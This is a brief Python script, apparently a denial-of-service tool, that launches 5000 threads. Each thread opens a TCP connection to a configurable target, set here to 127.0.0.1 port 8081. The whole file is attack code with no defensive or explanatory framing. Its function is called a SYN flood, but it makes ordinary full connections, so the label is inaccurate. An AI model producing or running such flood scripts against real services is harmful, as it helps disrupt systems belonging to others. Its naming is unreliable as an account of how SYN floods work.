import socket
import threading

def syn_flood(target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)  
    
    try:
        s.connect((target_ip, target_port))
        print(f"Connected to {target_ip}:{target_port}")
    except socket.error as e:
        print(f"Connection to {target_ip}:{target_port} failed: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    target_ip = "127.0.0.1"
    target_port = 8081

    threads = []
    for _ in range(5000):
        t = threading.Thread(target=syn_flood, args=(target_ip, target_port))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()